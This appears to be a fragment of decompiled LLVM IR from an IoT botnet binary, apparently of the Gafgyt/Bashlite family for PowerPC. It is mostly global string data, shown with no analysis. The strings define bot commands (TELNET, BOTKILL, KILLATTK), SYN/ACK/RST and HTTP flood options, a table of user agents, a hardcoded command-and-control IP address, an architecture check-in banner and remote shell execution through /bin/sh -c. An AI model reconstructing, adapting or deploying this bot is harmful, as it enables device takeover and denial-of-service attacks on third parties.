getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1001724c.500, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001725c.501, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017268.502, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017274.503, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1001727c.504, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10017284.505, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1001728c.506, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017294.507, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1001729c.508, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_100172a4.509, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100172b4.510, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100172bc.511, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100172c8.512, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100172d0.513, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100172dc.514, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100172e8.515, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100172f0.516, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100172fc.517, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10017304.518, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1001730c.519, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017318.520, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017324.521, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10017330.522, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017340.523, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1001734c.524, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017358.525, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_10017364.526, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017374.527, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017380.528, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1001738c.529, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10017398.530, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100173a0.531, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100173a8.532, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100173b4.533, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100173bc.534, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100173c8.535, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100173d4.536, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100173e0.537, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100173ec.538, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100173f8.539, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017404.540, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017410.541, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1001741c.542, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017428.543, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017434.544, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017440.545, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001744c.546, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017458.547, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017464.548, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017470.549, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001747c.550, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017488.551, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017494.552, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100174a0.553, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100174ac.554, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100174b8.555, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100174c4.556, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100174d0.557, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100174e0.558, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100174ec.559, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100174f8.560, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017504.561, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017510.562, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001751c.563, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017528.564, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017534.565, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017540.566, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001754c.567, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017558.568, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017564.569, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10017570.570, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10017580.571, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017590.572, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1001759c.573, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100175ac.574, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100175bc.575, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100175cc.576, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_100175d8.577, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100175f0.578, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100175fc.579, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017608.580, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017614.581, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10017620.582, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017630.583, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1001763c.584, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1001764c.585, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017658.586, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017664.587, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10017670.588, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017680.589, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1001768c.590, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1001769c.591, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100176a8.592, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100176b4.593, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100176c0.594, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100176cc.595, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100176d8.596, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100176e8.597, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100176f4.598, i32 0, i32 0)]
@global_var_10018c64.614 = constant i32 570425344
@global_var_10018c68.615 = constant [6 x i8] c"close\00"
@global_var_10018c70.616 = constant [11 x i8] c"keep-alive\00"
@global_var_10018c7c.617 = constant [7 x i8] c"accept\00"
@global_var_1002b140.621 = global [105 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_100149d0.333, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_10014a44.334, i32 0, i32 0), i8* getelementptr inbounds ([114 x i8], [114 x i8]* @global_var_10014ab4.335, i32 0, i32 0), i8* getelementptr inbounds ([114 x i8], [114 x i8]* @global_var_10014b28.336, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_10014b9c.337, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_10014c18.338, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_10014c88.339, i32 0, i32 0), i8* getelementptr inbounds ([114 x i8], [114 x i8]* @global_var_10014d04.340, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @global_var_10014d78.341, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_10014de0.342, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_10014e5c.343, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @global_var_10014ea8.344, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_10014f24.345, i32 0, i32 0), i8* getelementptr inbounds ([114 x i8], [114 x i8]* @global_var_10014f94.346, i32 0, i32 0), i8* getelementptr inbounds ([46 x i8], [46 x i8]* @global_var_10015008.347, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_10015038.348, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_100150b4.349, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_10015124.350, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_1001516c.351, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_100151e8.352, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_10015264.353, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_100152e0.354, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @global_var_1001532c.355, i32 0, i32 0), i8* getelementptr inbounds ([77 x i8], [77 x i8]* @global_var_10015398.356, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_100153e8.357, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_10015464.358, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_100154e0.359, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_1001552c.360, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_100155a8.361, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_10015624.362, i32 0, i32 0), i8* getelementptr inbounds ([66 x i8], [66 x i8]* @global_var_100156a0.363, i32 0, i32 0), i8* getelementptr inbounds ([66 x i8], [66 x i8]* @global_var_100156e4.364, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_10015728.365, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1001579c.366, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @global_var_10015810.367, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_10015888.368, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_100158fc.369, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_1001594c.370, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_100159c8.371, i32 0, i32 0), i8* getelementptr inbounds ([121 x i8], [121 x i8]* @global_var_10015a3c.372, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @global_var_10015ab8.373, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_10015b44.374, i32 0, i32 0), i8* getelementptr inbounds ([267 x i8], [267 x i8]* @global_var_10015b90.375, i32 0, i32 0), i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_10015c9c.376, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_10015cdc.377, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_10015d1c.378, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_10015dac.379, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_10015de4.380, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_10015e04.381, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_10015e1c.382, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @global_var_10015e74.383, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_10015f14.384, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_10015f68.385, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_10015fdc.386, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @global_var_1001601c.387, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_100160d4.388, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_10016128.389, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_10016180.390, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_100161d8.391, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_10016218.392, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_10016260.393, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_100162b8.394, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_10016324.395, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_1001637c.396, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_100163cc.397, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_100163f0.398, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1001644c.399, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_1001645c.400, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_1001648c.401, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_100164b0.402, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_100164d4.403, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_100164f0.404, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @global_var_10016530.405, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_100165bc.406, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_10016604.407, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_1001664c.408, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_10016694.409, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_100166dc.410, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_10016730.411, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @global_var_10016780.412, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_100167ec.413, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_10016840.414, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_1001689c.415, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @global_var_100168f8.416, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_1001695c.417, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_100169b8.418, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_10016a14.419, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @global_var_10016a70.420, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_10016ad0.421, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_10016b18.422, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_10016bb0.423, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_10016bfc.424, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_10016c48.425, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_10016c98.426, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @global_var_10016ce0.427, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_10016d34.428, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_10016d84.429, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_10016dcc.430, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_10016e18.431, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_10016e64.432, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_10016eac.433, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_10016efc.434, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_10016f4c.435, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_10016f80.436, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_10016fb4.437, i32 0, i32 0)]
@global_var_10018c90.622 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_10009f20.623 = constant i32 939524096
@global_var_10009fd8.624 = constant [3 x i8] c"8`\00"
@global_var_10018cd0.625 = constant [4 x i8] c"all\00"
@global_var_10018cd4.626 = constant i32 738197504
@global_var_10018cd8.627 = constant [4 x i8] c"syn\00"
@global_var_10018cdc.628 = constant [4 x i8] c"rst\00"
@global_var_10018ce0.629 = constant [4 x i8] c"fin\00"
@global_var_10018ce4.630 = constant [4 x i8] c"ack\00"
@global_var_10018ce8.631 = constant [4 x i8] c"psh\00"
@global_var_10018cec.632 = constant [4 x i8] c"std\00"
@global_var_1000a734.633 = constant [3 x i8] c"8`\00"
@global_var_1000a75c.634 = constant [3 x i8] c"8`\00"
@global_var_1000a764.635 = constant i32 939524096
@global_var_10018cf0.636 = constant [6 x i8] c"PONG!\00"
@global_var_1000a7ec.637 = constant i32 1207961892
@global_var_10018cf8.638 = constant [7 x i8] c"TELNET\00"
@global_var_10018d00.639 = constant [16 x i8] c"TELNET ON | OFF\00"
@global_var_1000a83c.640 = constant i32 1207961812
@global_var_10018d10.641 = constant [4 x i8] c"OFF\00"
@global_var_1002b928.642 = local_unnamed_addr global i32 0
@global_var_10018d14.643 = constant [13 x i8] c"[TELNET] OFF\00"
@global_var_10018d24.644 = constant [3 x i8] c"ON\00"
@global_var_10018d28.645 = constant [12 x i8] c"[TELNET] ON\00"
@global_var_1000a944.646 = constant [3 x i8] c"8`\00"
@global_var_10018d34.647 = constant [8 x i8] c"BOTKILL\00"
@global_var_10018d3c.648 = constant [13 x i8] c"Killing - %s\00"
@global_var_1000a9c0.649 = constant [3 x i8] c"8`\00"
@global_var_10018d4c.650 = constant [4 x i8] c"TCP\00"
@global_var_1000abd8.651 = constant [3 x i8] c"8`\00"
@global_var_1000abe0.652 = constant [3 x i8] c"8`\00"
@global_var_1000ac38.653 = constant [3 x i8] c"8`\00"
@global_var_10018d50.654 = constant [4 x i8] c"STD\00"
@global_var_1000ad58.655 = constant [3 x i8] c"8`\00"
@global_var_1000ad60.656 = constant [3 x i8] c"8`\00"
@global_var_1000ada8.657 = constant [3 x i8] c"8`\00"
@global_var_10018d54.658 = constant [4 x i8] c"GHP\00"
@global_var_1000aed4.659 = constant [3 x i8] c"8`\00"
@global_var_1000aedc.660 = constant [3 x i8] c"8`\00"
@global_var_1000afac.661 = constant [3 x i8] c"8`\00"
@global_var_10018d58.662 = constant [9 x i8] c"KILLATTK\00"
@global_var_10018d64.663 = constant [15 x i8] c"URSTRAITKANCER\00"
@global_var_1002b8b8.664 = local_unnamed_addr global i32 -1
@global_var_100146a0.665 = constant [15 x i8] c"185.158.113.30\00"
@global_var_1002b8a0.666 = global [15 x i8]* @global_var_100146a0.665
@global_var_1002b8a4.667 = local_unnamed_addr global i32 352
@global_var_10018d74.668 = constant [8 x i8] c"8.8.8.8\00"
@global_var_10018d7c.669 = constant [16 x i8] c"/proc/net/route\00"
@global_var_10018d8c.670 = constant [11 x i8] c"\0900000000\09\00"
@global_var_1000b4fc.671 = constant i32 939524096
@global_var_1002b908.672 = global i32 0
@global_var_1000b550.673 = constant i32 1207959564
@global_var_10018d98.674 = constant [8 x i8] c"POWERPC\00"
@global_var_10018da0.675 = constant [16 x i8] c"/usr/bin/python\00"
@global_var_10018db0.676 = constant [7 x i8] c"SERVER\00"
@global_var_10018db8.677 = constant [7 x i8] c"ROUTER\00"
@global_var_10018dc0.678 = constant i32 0
@global_var_10018dc4.679 = constant [19 x i8] c"/usr/sbin/dropbear\00"
@global_var_1002b8b4.680 = local_unnamed_addr global i32 1
@global_var_1000b714.681 = constant [3 x i8] c"8`\00"
@global_var_1000b734.682 = constant [3 x i8] c"8`\00"
@global_var_1000b758.683 = constant i32 1207962669
@global_var_1000b784.684 = constant [3 x i8] c"8`\00"
@global_var_1000b7b8.685 = constant i32 1207963413
@global_var_10018dd8.686 = constant i32 788529152
@global_var_1000b7c8.687 = constant [3 x i8] c"8`\00"
@global_var_1000b7d4.688 = constant i32 1207959556
@global_var_10018ddc.689 = constant [43 x i8] c"[ %s CONNECTED ] [ %s: ] [ Arch Type: %s ]\00"
@global_var_1000b848.690 = constant i32 939524096
@global_var_10018e08.691 = constant [5 x i8] c"PONG\00"
@global_var_1000bb8c.692 = constant i32 1207960708
@global_var_10018e10.693 = constant [4 x i8] c"DUP\00"
@global_var_10018e14.694 = constant [5 x i8] c"MOVE\00"
@global_var_10018e1c.695 = constant [8 x i8] c"%s 2>&1\00"
@1 = constant i32 1912602624
@global_var_1000be54.697 = constant [3 x i8] c"8`\00"
@global_var_1000be84.698 = constant [3 x i8] c"8`\00"
@global_var_1000be8c.699 = constant i32 939524097
@global_var_10018e28.700 = constant i32 536870912
@global_var_1000c0c8.701 = constant i32 1207959564
@global_var_1000c748.702 = constant i32 939524118
@global_var_1002b8c0 = external local_unnamed_addr global i32
@global_var_1002b958.708 = global i32 0
@global_var_1000c9f0.709 = constant [3 x i8] c" c\00"
@global_var_1000ca0c.710 = constant [3 x i8] c" c\00"
@global_var_1001942c.711 = constant i32 0
@global_var_1002b574.712 = global i32 0
@global_var_1002b58c.713 = global i32 0
@global_var_1002b8e0.714 = global i32* bitcast (i16* @global_var_1002b5a4.705 to i32*)
@global_var_1000cca8.715 = constant i32 1207961092
@global_var_1000cdd4.716 = constant i32 1207960768
@global_var_10019460.717 = constant i32 269488136
@global_var_10019444.718 = constant [6 x i8] c"(nil)\00"
@global_var_1001944c.719 = constant [7 x i8] c"(null)\00"
@global_var_10019454.720 = constant i32 721431808
@global_var_1000d230.721 = constant i32 939524096
@global_var_100194e0.722 = constant i32 65793
@global_var_100194c8.723 = constant i32 524293
@global_var_100194c0.724 = constant [8 x i8] c" +0-#'I\00"
@global_var_10019468.725 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_100194a8.726 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1001949c.727 = constant i32 67343
@global_var_1001949b.728 = constant i32 50331911
@global_var_1001948c.729 = constant i32 268435461
@global_var_1001947c.730 = constant i32 520093701
@global_var_1000dbd8.731 = constant i32 939589631
@global_var_1000dc8c.732 = constant i32 939524118
@global_var_100194fc.733 = constant [8 x i8] c"Success\00"
@global_var_100194ec.734 = constant [15 x i8] c"Unknown error \00"
@global_var_1001a236.735 = constant i32 1
@global_var_1002b8f4.736 = local_unnamed_addr global i32* @global_var_1001a236.735
@global_var_1002b938.737 = global i32 0
@global_var_1001a0e0.738 = constant [15 x i8] c"Resolver error\00"
@global_var_1001a060.739 = constant [8 x i8] c"Error 0\00"
@global_var_1001a068.740 = constant [13 x i8] c"Unknown host\00"
@global_var_1001a078.741 = constant [25 x i8] c"Host name lookup failure\00"
@global_var_1001a094.742 = constant [21 x i8] c"Unknown server error\00"
@global_var_1001a0ac.743 = constant [32 x i8] c"No address associated with name\00"
@global_var_1001a0cc.744 = constant [5 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1001a060.739, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1001a068.740, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_1001a078.741, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_1001a094.742, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_1001a0ac.743, i32 0, i32 0)]
@global_var_1001a0f2.745 = constant i32 0
@global_var_1001a0f0.746 = constant [3 x i8] c": \00"
@global_var_1001a058.747 = constant [8 x i8] c"%s%s%s\0A\00"
@global_var_10031998.748 = global i32 0
@global_var_10031b74.749 = global i32 0
@global_var_100319a8.750 = global i32 0
@global_var_1002b870.751 = global i32 0
@global_var_10010048.752 = constant [3 x i8] c"8`\00"
@global_var_1002b964.753 = local_unnamed_addr global i32 0
@global_var_10031c60.754 = global i32 0
@global_var_1000ea8c.755 = constant [3 x i8] c"8`\00"
@global_var_1000eb70.756 = constant i32 939524098
@global_var_1000ebb0.757 = constant [3 x i8] c"8`\00"
@global_var_1000edb8.758 = constant i32 939524118
@global_var_1000ee40.759 = constant i32 939524118
@global_var_10031bb8.760 = global i32 0
@global_var_10031b88.761 = global i32 0
@global_var_1002b8e8 = external global i32
@global_var_1002b948.764 = local_unnamed_addr global i32 0
@global_var_10031c38.765 = global i32 0
@global_var_1000f09c.766 = constant i32 939524108
@global_var_1000f134.767 = constant [3 x i8] c"8`\00"
@global_var_1000f33c.768 = constant i32 1207959640
@global_var_1000f378.769 = constant i32 1207959580
@global_var_1002b7a0.770 = global i32 0
@global_var_1002b7b8 = external global i32
@global_var_1002b7d8.772 = global i32 -1726662223
@global_var_1002b7c0.773 = local_unnamed_addr global i32* @global_var_1002b7d8.772
@global_var_1002b7bc.774 = global i32* @global_var_1002b7d8.772
@global_var_1001a0f4.775 = constant i32 0
@global_var_1000f690.776 = constant i32 939524118
@global_var_1001a11c.777 = constant [8 x i8] c"/bin/sh\00"
@global_var_1001a124.778 = constant [3 x i8] c"sh\00"
@global_var_1001a128.779 = constant [3 x i8] c"-c\00"
@global_var_1000f9e4.780 = constant [3 x i8] c"8`\00"
